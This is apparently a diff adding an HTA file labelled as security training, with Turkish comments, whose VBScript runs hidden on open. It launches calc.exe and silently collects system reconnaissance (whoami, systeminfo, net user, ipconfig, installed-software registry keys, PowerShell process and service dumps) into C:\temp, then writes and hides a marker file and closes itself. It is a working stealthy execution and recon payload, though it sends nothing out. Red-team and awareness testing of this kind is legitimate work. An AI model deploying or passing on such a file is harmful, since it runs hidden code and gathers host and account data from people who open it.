@@ -1,0 +1,82 @@
+<html>
+<head>
+<title>Security Training - HTA Test</title>
+<HTA:APPLICATION 
+    ID="HTATest"
+    APPLICATIONNAME="Security Training HTA"
+    BORDER="no"
+    CAPTION="no"
+    SHOWINTASKBAR="no"
+    SINGLEINSTANCE="yes"
+    SYSMENU="no"
+    WINDOWSTATE="minimize">
+</head>
+<body>
+<script language="VBScript">
+Sub Window_onLoad
+    On Error Resume Next
+    
+    ' ActiveX nesneleri oluştur
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ' Temp klasörü oluştur
+    tempPath = "C:\temp\"
+    If Not fso.FolderExists(tempPath) Then
+        fso.CreateFolder(tempPath)
+    End If
+    
+    ' Test işlemleri
+    shell.Run "calc.exe", 0, False
+    
+    ' Sistem bilgisi toplama
+    shell.Run "cmd.exe /c whoami > """ & tempPath & "hta_user.txt""", 0, True
+    shell.Run "cmd.exe /c hostname > """ & tempPath & "hta_hostname.txt""", 0, True
+    shell.Run "cmd.exe /c systeminfo > """ & tempPath & "hta_systeminfo.txt""", 0, True
+    shell.Run "cmd.exe /c tasklist > """ & tempPath & "hta_processes.txt""", 0, True
+    shell.Run "cmd.exe /c net user > """ & tempPath & "hta_users.txt""", 0, True
+    shell.Run "cmd.exe /c ipconfig /all > """ & tempPath & "hta_network.txt""", 0, True
+    
+    ' Registry bilgisi
+    shell.Run "cmd.exe /c reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall > """ & tempPath & "hta_software.txt""", 0, True
+    
+    ' Test dosyası oluştur
+    Set file = fso.CreateTextFile(tempPath & "hta_execution_test.txt", True)
+    file.WriteLine "HTA Execution Test - " & Now()
+    file.WriteLine "User: " & shell.ExpandEnvironmentStrings("%USERNAME%")
+    file.WriteLine "Computer: " & shell.ExpandEnvironmentStrings("%COMPUTERNAME%")
+    file.WriteLine "Domain: " & shell.ExpandEnvironmentStrings("%USERDOMAIN%")
+    file.WriteLine "OS: " & shell.ExpandEnvironmentStrings("%OS%")
+    file.WriteLine "Processor: " & shell.ExpandEnvironmentStrings("%PROCESSOR_IDENTIFIER%")
+    file.Close
+    
+    ' PowerShell komutları
+    shell.Run "powershell.exe -Command ""Get-Process | Export-Csv " & tempPath & "hta_ps_processes.csv""", 0, True
+    shell.Run "powershell.exe -Command ""Get-Service | Export-Csv " & tempPath & "hta_services.csv""", 0, True
+    shell.Run "powershell.exe -Command ""Get-WmiObject -Class Win32_ComputerSystem | Export-Csv " & tempPath & "hta_computer_info.csv""", 0, True
+    
+    ' Gizli dosya oluştur
+    Set hiddenFile = fso.CreateTextFile(tempPath & "hta_hidden_info.txt", True)
+    hiddenFile.WriteLine "Hidden execution successful"
+    hiddenFile.WriteLine "Execution time: " & Now()
+    hiddenFile.Close
+    
+    ' Dosyayı gizle
+    shell.Run "attrib +h """ & tempPath & "hta_hidden_info.txt""", 0, True
+    
+    ' Pencereyi kapat
+    window.close
+End Sub
+
+Sub Window_onUnload
+    ' Cleanup işlemleri
+End Sub
+</script>
+
+<div style="display:none">
+    <p>HTA Security Training Test</p>
+    <p>This HTA file is used for security training purposes.</p>
+</div>
+
+</body>
+</html>
